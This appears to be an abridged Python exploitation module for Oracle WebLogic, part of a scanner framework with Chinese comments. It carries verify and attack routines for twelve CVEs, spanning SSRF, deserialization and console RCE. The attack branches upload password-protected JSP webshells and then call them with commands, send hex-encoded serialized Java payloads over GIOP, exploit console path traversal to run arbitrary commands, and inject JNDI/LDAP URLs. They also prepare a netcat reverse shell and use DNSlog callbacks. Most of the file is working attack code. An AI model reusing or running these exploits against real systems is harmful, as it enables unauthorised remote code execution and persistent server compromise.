import random,string,http.client,re,socket,time,ssl
...
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Oracle Weblogic   | cve_2014_4210    |  Y  |  N  | 10.0.2 - 10.3.6, weblogic ssrf vulnerability                |
| Oracle Weblogic   | cve_2017_3506    |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.0-2, weblogic wls-wsat rce       |
| Oracle Weblogic   | cve_2017_10271   |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.1-2, weblogic wls-wsat rce       |
| Oracle Weblogic   | cve_2018_2894    |  Y  |  Y  | 12.1.3.0, 12.2.1.2-3, deserialization any file upload       |
| Oracle Weblogic   | cve_2019_2725    |  Y  |  Y  | 10.3.6.0, 12.1.3.0, weblogic wls9-async deserialization rce |
| Oracle Weblogic   | cve_2019_2729    |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.3 wls9-async deserialization rce |
| Oracle Weblogic   | cve_2020_2551    |  Y  |  N  | 10.3.6.0, 12.1.3.0, 12.2.1.3-4, wlscore deserialization rce |
| Oracle Weblogic   | cve_2020_2555    |  Y  |  Y  | 3.7.1.17, 12.1.3.0.0, 12.2.1.3-4.0, t3 deserialization rce  |
| Oracle Weblogic   | cve_2020_2883    |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.3-4, iiop t3 deserialization rce |
| Oracle Weblogic   | cve_2020_14882   |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.3-4, 14.1.1.0.0, console rce     |
| Oracle Weblogic   | cve_2020_14883   |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.3-4, 14.1.1.0.0, console rce     |
| Oracle Weblogic   | cve_2021_2109    |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.3-4, 14.1.1.0.0, console rce     |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
"""
class weblogic():
    def __init__(self, **env):
        ...
        self.payload_cve_2017_3506_exp = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/' \
            ...
            'env:Envelope>'
        self.payload_cve_2017_10271_rce = ('<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><void class="sun.misc.BASE64Decoder"><void method="decodeBuffer" id="byte_arr"><string></string></void></void><void class="weblogic.utils.classloaders.ClasspathClassLoader"><void method="defineCodeGenClass"><string>superman.shells.HttpEchoShell</string><object idref="byte_arr"></object><object class="java.net.URL"/></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>')
...
#        self.payload_cve_2020_2555 += '{:04x}'.format(len(self.CMD))
#        self.payload_cve_2020_2555 += self.CMD.encode().hex()
...
#        self.payload_cve_2020_2555 = '%s%s' % ('{:08x}'.format(len(self.payload_cve_2020_2555) // 2 + 4), self.payload_cve_2020_2555)
    ...
    def cve_2014_4210(self):
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+path, headers=self.headers)
                if r"UDDI Explorer" in request.text and request.status_code == 200:
    ...
    def cve_2017_3506(self):
        appName = 'weblogic'
        pocname = "cve_2017_3506"
        name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
        filename = name+".jsp"
        payload = self.payload_cve_2017_3506_exp.replace("REWEBSHELL", filename)
        method = 'post'
        info = '[upload]'
        #输出类
        output = Output(self.url, appName, pocname)
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.url+"/wls-wsat/CoordinatorPortType", 
                    data=self.payload_cve_2017_3506_poc, headers=self.headers)
                
                req = exprequest.get(self.url+"/wls-wsat/test.log", headers=self.headers)
                if ':-)' in req.text:
                    return output.no_echo_success(method, info)
            ...
            #_attack
                ...
                exprequest.post(self.url+"/wls-wsat/CoordinatorPortType", data=payload, headers=self.headers)
                shellpath = self.url+"/wls-wsat/"+filename+"?pwd=password&cmd="+self.cmd
                request = exprequest.get(shellpath, headers=self.headers)
                r = "Upload Webshell: "+shellpath+"\n-------------------------\n"
                print(r)
        except Exception as error:
            return output.error_output(str(error))
    ...
    def cve_2017_10271(self):
        appName = 'weblogic'
        pocname = "cve_2017_10271"
        path = "/wls-wsat/CoordinatorPortType"
        method = 'post'
        info = '[nc shell]'
        name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
        filename = name+".jsp"
        payload = '<![CDATA[<% if("password".equals(request.getParameter("pwd"))){ java.io.InputStream in =' \
                ...
                'out.print("</pre>"); } %>]]>'
        poc = self.payload_cve_2017_10271_upload.replace("REWEBSHELL", filename).replace("REPAYLOAD", ":-)")
        exp = self.payload_cve_2017_10271_upload.replace("REWEBSHELL", filename).replace("REPAYLOAD", payload)
        #反弹shell的利用
        ncip = ''
        ncport = ''
        nc = self.weblogic_nc.replace("REIP", ncip).replace("REPORT", ncport)
        ...
        try:
            ...
            #_attack
                ...
                exprequest.post(self.url+path, data=exp, headers=self.headers)
                shellpath = self.url + "/bea_wls_internal/" + filename + "?pwd=password&cmd=" + self.cmd
                request = exprequest.get(shellpath, headers=self.headers)
                r = "Upload Webshell: " + shellpath + "\n-------------------------\n"
                print(r)
        except Exception as error:
    ...
    def cve_2018_2894(self):
        appName = 'weblogic'
        pocname = "cve_2018_2894"
        payload1 = "/ws_utc/resources/setting/options/general"        
        method = 'get'
        info = '[deupload]'
        name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
        filename = name+".jsp"
        path = "/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/" \
        ...
        files = {
            ...
            "ks_filename": (filename, self.jsp_webshell)
        } 
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+payload1, headers=self.headers)
                if request.status_code == 200 and r"BasicConfigOptions" in request.text:
                    return output.no_echo_success(method, info)
                else:
                    return output.fail()
            #_attack
            else:
                request = exprequest.post(self.url+"/ws_utc/resources/setting/options", data=data, 
                    headers=self.headers)
                request = exprequest.post(self.url+"/ws_utc/resources/setting/keystore", files=files, 
                    headers=self.headers)
                match = re.findall("<id>(.*?)</id>", request.text)
                tid = match[-1]
                shellpath = self.url+"/ws_utc/css/config/keystore/"+str(tid)+"_"+filename
                request = exprequest.get(shellpath, headers=self.headers)
                request = exprequest.get(shellpath+"?pwd=password&cmd="+self.cmd, headers=self.headers)
                r = "Upload Webshell: "+shellpath+"\n-------------------------\n"
                print(r)
        except Exception as error:
            return output.error_output(str(error))
    ...
    def cve_2019_2725(self):
        appName = 'weblogic'
        pocname = "cve_2019_2725"
        payload_path = "/_async/AsyncResponseService"
        method = 'post'
        info = '[nc shell]'
        name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
        filename = name+".jsp"
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url + "/console", headers=self.headers)
                v = re.findall("WebLogic Server Version: (.*?)</p>", request.text)[0]
                if r"10" in v:
                    payload = self.payload_cve_2019_2725_rce_10
                elif r"12" in v:
                    payload = self.payload_cve_2019_2725_rce_12.replace("RECOMMAND", self.cmd)
                else:
                    payload = self.payload_cve_2019_2725_rce_10
                request = exprequest.post(self.url + "/wls-wsat/CoordinatorPortType", data=payload,
                                            headers=headers_rce)
                if self.flag in request.text:        
                    return output.no_echo_success(method, info)
            ...
            #_attack
                ...
                payload_webshell = self.payload_cve_2019_2725.replace("REWEBSHELL", "z.jsp")
                request = exprequest.post(self.url+"/_async/AsyncResponseService", data=payload_webshell, 
                        headers=self.headers)
                shellpath = self.url+"/_async/"+"z.jsp"
                request = exprequest.get(shellpath+"?pwd=password&cmd="+self.cmd, headers=self.headers)
                r = "Upload Webshell: "+shellpath+"?pwd=password&cmd="+self.cmd+"\n-------------------------\n"
                print(r)
        except Exception as error:
            return output.error_output(str(error))
    ...
    def cve_2019_2729(self):
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.url+path, data=self.payload_cve_2019_2729, headers=headers)
                if self.flag in request.text:
                    return output.echo_success(method, appName)
    ...
    def cve_2020_2551(self):
        appName = 'weblogic'
        pocname = "cve_2020_2551"
        method = 'iiop'
        info = '>_< Vuln CVE-2020-2551 send using iiop protocol. So no http request and response'
    ...
    def cve_2020_2555(self):
        appName = 'weblogic'
        pocname = 'cve_2020_2555'
        method = 'giop'
        # GIOP针对不同的通信层有不同的具体实现，而针对于TCP/IP层，其实现名为IIOP
        info = '>_< Vuln CVE-2020-2555 send using giop protocol. So no http request and response'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        # exprequest = ExpRequest(output)
        # vuln_v = ['3.7.1.17','12.1.3.0.0','12.2.1.3.0','12.2.1.4.0']
        try:
            #_verify
            if self.vuln == 'False':
                if r"https" in self.url:
                ...
                sock.settimeout(self.timeout)
                sock.connect((self.hostname, self.port))
                sock.sendall(bytes.fromhex('47494f50010200030000001700000002000000000000000b4e616d6553657276696365'))
                data = sock.recv(20)
                if b'GIOP' in data:
                    return output.no_echo_success(method, info='%s 目标启用GIOP协议!'%self.hostname)
                else:
                    return output.fail(info='%s 目标已禁用GIOP协议!'%self.hostname)
                
                # request = exprequest.get(self.url + "", headers=self.headers)
                # if len(re.findall("WebLogic Server Version: (.*?)</p>", request.text)) == 0:
                #     return output.fail(info='[not found WebLogic Server Version]')
                # v = re.findall("WebLogic Server Version: (.*?)</p>", request.text)[0]
                # vuln_v = ['3.7.1.17','12.1.3.0.0','12.2.1.3.0','12.2.1.4.0']
                # if v in vuln_v:
                #     return output.no_echo_success(method, info)
                # else:
                #     return output.fail(info='[WebLogic Server Version: '+v+']')
            #_attack
            else:
                if r"https" in self.url:
                    sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
                ...
                payload = ('056508000000010000001b0000005d01010073720178707372027870000000000000000075720378700'
                    ...
                    '078fe010000')
                payload += ('aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c75'
                ...
                payload += '{:04x}'.format(len(self.cmd))
                payload += self.cmd.encode().hex()
                payload += '7400046578656370767200116a6176612e6c616e672e52756e74696d650000000000000000000000787070'
                payload += ('fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c65536572766963'
                ...
                sock.send(bytes.fromhex(payload))
                sock.close()
                print("[*]Payload sent successfully (No Echo)")
        except Exception as error:
            return output.error_output(str(error))
    ...
    def cve_2020_2883(self):
        appName = 'weblogic'
        pocname = "cve_2020_2883"
        method = 'giop'
        info = '>_< Vuln CVE-2020-2883 send using giop protocol. So no http request and response'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        # exprequest = ExpRequest(output)
        # vuln_v = ['10.3.6.0.0','12.1.3.0.0','12.2.1.3.0','12.2.1.4.0']
        try:
            #_verify
            if self.vuln == 'False':
                if r"https" in self.url:
    ...
    def cve_2020_14882(self):
        appName = 'weblogic'
        pocname = "cve_2020_14882"
        method = 'post'
        path = "/console/css/%252e%252e%252fconsole.portal"
        payload = self.payload_cve_2020_14882_v12
        headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
    ...
    def cve_2020_14883(self):
        appName = 'weblogic'
        pocname = "cve_2020_14883"
        method = 'get'
        path = "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27{}%27);%22)"
        info = '[rce]'        
        headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
        ...
        try:
            ...
            if self.vuln == 'False':
                dnslog = Dnslog()
                path = path.format('ping '+ dnslog.dns_host())
            ...
            #_attack
                ...
                path = path.format(self.cmd)
                request = exprequest.get(self.url + path, headers=headers)
                print(request.text)
        except Exception as error:
            return output.error_output(str(error))
            
    def cve_2021_2109(self):
        appName = 'weblogic'
        pocname = 'cve_2021_2109'
        path = '/console/css/%252e%252e%252f/consolejndi.portal'
        method = 'post'
        desc = '[rce] app = weblogic'
        data = '_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://{}:1389/Basic/WeblogicEcho;AdminServer%22)'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded', 'cmd': 'whoami'}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                dnslog = Dnslog()
                exprequest.post(self.url+path, data=data.format(dnslog.dns_host()), headers=headers)
                if dnslog.result():
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=data.format(self.cmd), headers=headers).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
...
def check(**kwargs):
    thread_list = []
    ExpOracleWeblogic = weblogic(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpOracleWeblogic, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(weblogic):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpOracleWeblogic, func)))
    #保存全局子线程列表
